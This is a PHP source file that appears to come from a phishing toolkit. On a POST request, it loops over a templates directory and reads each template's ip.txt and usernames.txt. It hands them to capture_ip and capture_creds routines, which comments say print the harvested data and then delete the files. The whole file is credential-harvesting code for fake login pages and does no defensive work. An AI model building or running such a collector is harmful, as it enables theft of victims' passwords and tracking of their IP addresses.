<?php

include "include/classes/control.php";

$PATH = "./templates/";
$FILE_IP = "/ip.txt";
$FILE_USERNAME = "/usernames.txt";


if(isset($_POST['send_me_result'])){

    $data = array_slice(scandir($PATH),2);

    foreach($data as $i ){
        if (file_exists($PATH.$i.$FILE_IP)){
            $data_IP = file_get_contents($PATH.$i.$FILE_IP);
            if(!empty($data_IP)){
                Control::capture_ip($PATH.$i.$FILE_IP); // Checking IP.txt File and print Information inside this file and remove this file
                // echo $data_IP;
                // file_put_contents("./saved/IP.dat", $data_IP);
                // unlink($PATH.$i.$FILE_IP); //remove ip.txt file from templates
            }
        }
        if (file_exists($PATH.$i.$FILE_USERNAME)){
            $data_USERS = file_get_contents($PATH.$i.$FILE_USERNAME);
            if (!empty($data_USERS)){
                Control::capture_creds($PATH.$i.$FILE_USERNAME); // Checking usernames.txt File and print Information inside this file and remove this file
            } 
        }

    }

}

?>